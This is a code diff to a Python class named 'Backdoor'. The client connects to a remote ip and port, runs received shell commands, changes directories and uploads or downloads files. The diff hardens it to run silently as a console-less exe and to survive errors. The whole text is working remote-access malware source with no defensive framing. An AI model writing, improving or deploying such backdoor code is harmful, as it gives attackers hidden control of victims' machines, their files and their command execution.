@@ -5,6 +5,7 @@ import subprocess
 import json
 import os
 import base64
+import sys
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -28,7 +29,9 @@ class Backdoor:
                 continue
         
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL) # We redirect the standard error and the standard input to nothing so it won't crash when we execute it as exe without the console
+        # For pyhthon 2:
+        # DEVNULL = open(os.devnull, 'wb')
 
     def change_working_directory_tool(self, path):
         os.chdir(path)
@@ -47,26 +50,26 @@ class Backdoor:
         while True:
             command = self.reliable_receive()
             
-            #try:
-            if command[0] == "exit":
-                self.connection.close()
-                exit()
-            elif command[0] == "cd" and len(command) > 1:
-                command_result = self.change_working_directory_tool(command[1])
-            elif command[0] == "download":
-                # command_result = self.read_file(command[1])
-                command_result = self.read_file(command[1]).decode()
-            elif command[0] == "upload":
-                command_result = self.write_file(command[1], command[2])
-            else:
-                # command = self.connection.recv(1024)
-                # command_result = self.execute_system_command(command) # It can take either a string or a list of strings as input command
-                try:
-                    command_result = self.execute_system_command(command).decode()
-                except UnicodeDecodeError:
-                    command_result = self.execute_system_command(command).decode("iso-8859-1")
-            #except Exception:
-                #command_result = "[-] Error during command execution."
+            try:
+                if command[0] == "exit":
+                    self.connection.close()
+                    sys.exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_working_directory_tool(command[1])
+                elif command[0] == "download":
+                    # command_result = self.read_file(command[1])
+                    command_result = self.read_file(command[1]).decode()
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1], command[2])
+                else:
+                    # command = self.connection.recv(1024)
+                    # command_result = self.execute_system_command(command) # It can take either a string or a list of strings as input command
+                    try:
+                        command_result = self.execute_system_command(command).decode()
+                    except UnicodeDecodeError:
+                        command_result = self.execute_system_command(command).decode("iso-8859-1")
+            except Exception:
+                command_result = "[-] Error during command execution."
 
             # self.connection.send(command_result)
             self.reliable_send(command_result)
